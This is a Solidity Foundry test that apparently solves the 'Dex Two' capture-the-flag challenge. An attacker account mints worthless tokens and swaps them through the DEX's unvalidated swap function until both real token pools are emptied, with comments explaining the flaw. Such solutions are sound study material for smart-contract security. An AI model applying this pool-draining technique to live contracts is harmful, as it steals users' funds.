// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/contracts/23_DexTwo.sol";

contract DexTwoTest is Test {
    address private owner = makeAddr("owner");
    address private attacker = makeAddr("attacker");
    DexTwo private dexTwo;
    SwappableTokenTwo private token1;
    SwappableTokenTwo private token2;

    function setUp() public {
        vm.startPrank(owner);

        dexTwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(dexTwo), "Token 1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dexTwo), "Token 2", "TK2", 110);

        dexTwo.setTokens(address(token1), address(token2));

        token1.approve(owner, address(dexTwo), 100);
        token2.approve(owner, address(dexTwo), 100);

        dexTwo.add_liquidity(address(token1), 100);
        dexTwo.add_liquidity(address(token2), 100);

        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);

        vm.stopPrank();
    }

    function test_DexTwoExploitVulnerability() public {
        // This challenge is even easier. We can drain both token1 and token2 pools
        // The vulnerability is that DexTwo swap function misses the checks for whitelisted token1 and token1
        // Without checking if the tokens are valid, a user can just use arbitrary fake token1 and token2 to exhange for real token1 and token2
        vm.startPrank(attacker);
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(
            address(dexTwo),
            "Fake 1",
            "FTK1",
            1000
        );
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(
            address(dexTwo),
            "Fake 2",
            "FTK2",
            1000
        );

        fakeToken1.approve(attacker, address(dexTwo), 1000);
        fakeToken2.approve(attacker, address(dexTwo), 1000);
        vm.stopPrank();

        vm.startPrank(address(dexTwo));
        fakeToken1.transferFrom(attacker, address(dexTwo), 100);
        fakeToken2.transferFrom(attacker, address(dexTwo), 100);
        vm.stopPrank();

        vm.startPrank(attacker);
        dexTwo.swap(address(fakeToken1), address(token1), 100);
        dexTwo.swap(address(fakeToken2), address(token2), 100);
        vm.stopPrank();

        assertEq(dexTwo.balanceOf(address(token1), address(dexTwo)), 0);
        assertEq(dexTwo.balanceOf(address(token2), address(dexTwo)), 0);
    }
}
